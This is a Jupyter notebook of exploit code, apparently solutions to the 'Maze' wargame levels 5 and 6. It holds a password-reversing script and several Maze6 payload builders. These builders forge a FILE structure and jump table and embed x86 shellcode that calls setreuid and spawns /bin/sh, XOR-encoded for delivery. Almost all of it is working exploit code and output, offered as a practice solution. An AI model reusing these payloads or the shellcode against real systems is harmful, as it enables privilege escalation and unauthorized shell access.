{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "322420958"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x1337C0DE"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Maze5\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "p: <>A780?-\n",
      "result: 7\n",
      "p: <>A780?-, j: 7, passw: <>A780?-, result: 7\n",
      "result: 6\n",
      "result: 5\n",
      "result: 4\n",
      "result: 3\n",
      "result: 2\n",
      "result: 1\n",
      "result: 0\n",
      "result: -1\n",
      "result: 1\n"
     ]
    }
   ],
   "source": [
    "p = \"printlol\"\n",
    "q = \"\"\n",
    "user = \"useruser\"\n",
    "passw = \"<>A780?-\"\n",
    "\n",
    "for i in range(len(user)):\n",
    "    num = ord(p[i]) - (i * 2 + ord(user[i]) - 65)\n",
    "    q += chr(num)\n",
    "\n",
    "i = len(user)\n",
    "p = q\n",
    "flag = False\n",
    "print(f\"p: {p}\")\n",
    "\n",
    "\n",
    "def do():\n",
    "    global i, j, p, passw, result, flag\n",
    "    result = i - 1\n",
    "    print(f\"result: {result}\")\n",
    "    if i == 0:\n",
    "        result = 1\n",
    "        flag = True\n",
    "\n",
    "    j = i - 1\n",
    "    i = result\n",
    "\n",
    "\n",
    "do()\n",
    "print(f\"p: {p}, j: {j}, passw: {passw}, result: {result}\")\n",
    "while p[j] == passw[result]:\n",
    "    if flag:\n",
    "        break\n",
    "    do()\n",
    "result = 0 if not flag else result\n",
    "print(f\"result: {result}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Maze6\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xff\\xff\\xd8\\x00'\n",
      "b'\\x04\\x08\\x04\\x04'\n",
      "b'\\xff\\xff\\xd9T'\n",
      "b'\\xff\\xff\\xdc\\xdd'\n",
      "b'\\xff\\xff\\xd8\\xbc'\n",
      "b'\\x07\\xf7\\xd5\\xd5'\n",
      "payload: b'\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*\\xd5\\xd5\\xf2*.\"..\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf3~\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\xd5\\xd5\\xf6\\xf7\\x07\\xf7\\xd5\\xd5'\n"
     ]
    }
   ],
   "source": [
    "# python3 -c 'import sys; sys.stdout.buffer.write(b\"\\x2a\\xf2\\xd5\\xd5\"*17 + b\"\\x2e\\x2e\\x22\\x2e\" + b\"\\x7e\\xf3\\xd5\\xd5\"*22 + b\"\\xf7\\xf6\\xd5\\xd5\"*24 + b\"\\x96\\xf2\\xd5\\xd5\")'\n",
    "\n",
    "import sys\n",
    "import struct\n",
    "\n",
    "payload = b\"\".join(\n",
    "    [\n",
    "        b\"\\x2a\\xf2\\xd5\\xd5\"[::-1] * 17,\n",
    "        b\"\\x2e\\x2e\\x22\\x2e\"[::-1],\n",
    "        b\"\\x7e\\xf3\\xd5\\xd5\"[::-1] * 22,\n",
    "        b\"\\xf7\\xf6\\xd5\\xd5\"[::-1] * 24,\n",
    "        b\"\\x96\\xf2\\xd5\\xd5\"[::-1],\n",
    "    ]\n",
    ")\n",
    "\n",
    "payload = bytes([_ ^ 42 for _ in payload])\n",
    "old_clip = b\"\"\n",
    "for i in range(0, len(payload), 4):\n",
    "    clip = payload[i : i + 4]\n",
    "    if clip != old_clip:\n",
    "        print(payload[i : i + 4])\n",
    "    old_clip = payload[i : i + 4]\n",
    "\n",
    "EGG_ADDRESS = bytes([_ ^ 42 for _ in struct.pack(\"I\", 0xFFFFDD2D)])\n",
    "print(EGG_ADDRESS)\n",
    "\n",
    "payload = (\n",
    "    b\"\\x2a\\xf2\\xd5\\xd5\"[::-1] * 17\n",
    "    + b\"\\x2e\\x2e\\x22\\x2e\"[::-1]\n",
    "    + b\"\\x7e\\xf3\\xd5\\xd5\"[::-1] * 22\n",
    "    + b\"\\xf7\\xf6\\xd5\\xd5\"[::-1] * 24\n",
    "    + b\"\\x07\\xf7\\xd5\\xd5\"\n",
    ")\n",
    "\n",
    "# sys.stdout.buffer.write(payload)\n",
    "print(f\"payload: {payload}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buf: b'kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk\\x8e\\xfa\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5n\\xfb\\xd5\\xd5N\\xfb\\xd5\\xd5N\\xfb\\xd5\\xd5N\\xfb\\xd5\\xd5N\\xfb\\xd5\\xd5N\\xfb\\xd5\\xd5N\\xfb\\xd5\\xd5N\\xfb\\xd5\\xd5N\\xfb\\xd5\\xd5\\xba\\xba\\xba\\xba\\xba\\xba\\xba\\xba\\xba\\xba\\xba\\xba\\xba\\xba\\xba\\xba@\\x1br\\xb3\\xe7\\xaa\\xa3\\xe9\\xa3\\xeb@lr\\xe7\\xaa\\x9a!xBD\\x05YBB\\x05\\x05HC\\xa3\\xc9\\xa3\\xfb\\xe7\\xaa\\x8e\\xfa\\xd5\\xd5'\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "import struct\n",
    "\n",
    "BUFFER_ADDRESS = 0xFFFFCFA4\n",
    "FAKE_FILE_ADDRESS = 0xFFFFD0A4\n",
    "FAKE_JUMP_TABLE = FAKE_FILE_ADDRESS + 160\n",
    "SHELLCODE_ADDRESS = FAKE_JUMP_TABLE + 32\n",
    "\n",
    "SHELLCODE = b\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\"\n",
    "\n",
    "buf = b\"A\" * (FAKE_FILE_ADDRESS - BUFFER_ADDRESS)\n",
    "buf += struct.pack(\"I\", FAKE_FILE_ADDRESS)\n",
    "for i in range(160 // 4):\n",
    "    buf += struct.pack(\"I\", FAKE_JUMP_TABLE)\n",
    "for i in range(32 // 4):\n",
    "    buf += struct.pack(\"I\", SHELLCODE_ADDRESS)\n",
    "\n",
    "buf += b\"\\x90\" * 16 + SHELLCODE\n",
    "buf += struct.pack(\"I\", FAKE_FILE_ADDRESS)\n",
    "\n",
    "buf = bytes([_ ^ 42 for _ in buf])\n",
    "# print(f\"buf: {buf}\")\n",
    "sys.stdout.buffer.write(buf)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7\\xa8\\xd7\\xfa\\xf7j1X\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1jFX\\xcd\\x80\\xb0\\x0bRhn/shh//bi\\x89\\xe3\\x89\\xd1\\xcd\\x80AA\\xa4\\xd0\\xff\\xff'\n",
      "b'kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk\"kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd\\x82\\xfd\\xd0\\xdd@\\x1br\\xb3\\xe7\\xaa\\xa3\\xe9\\xa3\\xeb@lr\\xe7\\xaa\\x9a!xBD\\x05YBB\\x05\\x05HC\\xa3\\xc9\\xa3\\xfb\\xe7\\xaakk\\x8e\\xfa\\xd5\\xd5'\n",
      "260\n"
     ]
    }
   ],
   "source": [
    "import struct\n",
    "\n",
    "fake_file_addr = 0xFFFFD0A4  # 你的buf首地址\n",
    "buf_size = 256  # char buf[256]\n",
    "fake_file_size = 0x94 + 8  # 跳table所需偏移\n",
    "jump_table_num = 16  # 合理数量，够覆盖\n",
    "\n",
    "shellcode = (\n",
    "    b\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\"\n",
    "    b\"\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\"\n",
    "    b\"\\x89\\xd1\\xcd\\x80\"\n",
    ")\n",
    "\n",
    "offset_shellcode = fake_file_size + jump_table_num * 4\n",
    "\n",
    "payload = b\"\"\n",
    "\n",
    "# 1. fake FILE结构体，0x46 设为 8\n",
    "payload += b\"A\" * 0x46\n",
    "payload += b\"\\x08\"\n",
    "payload += b\"A\" * (fake_file_size - len(payload))\n",
    "\n",
    "# 2. fake jump table 全指向 shellcode\n",
    "shellcode_addr = fake_file_addr + offset_shellcode\n",
    "IO_file_jumps_addr = 0xF7FAD7A8\n",
    "for _ in range(jump_table_num):\n",
    "    payload += struct.pack(\"<I\", IO_file_jumps_addr)\n",
    "\n",
    "# 3. shellcode（加少量NOP防止极端偏移误差)\n",
    "payload += b\"\\x90\" * 0\n",
    "payload += shellcode\n",
    "\n",
    "# 4. 补齐buf长度\n",
    "if len(payload) < buf_size:\n",
    "    payload += b\"A\" * (buf_size - len(payload))\n",
    "\n",
    "# 5. 覆盖fp，写buf首地址\n",
    "payload += struct.pack(\"<I\", fake_file_addr)\n",
    "\n",
    "# 6. 输出payload\n",
    "import sys\n",
    "\n",
    "# print(payload)\n",
    "payload = bytes([_ ^ 42 for _ in payload])\n",
    "sys.stdout.buffer.write(payload)\n",
    "# print(payload)\n",
    "# print(len(payload))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'A'"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "chr(0x6B ^ 42)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
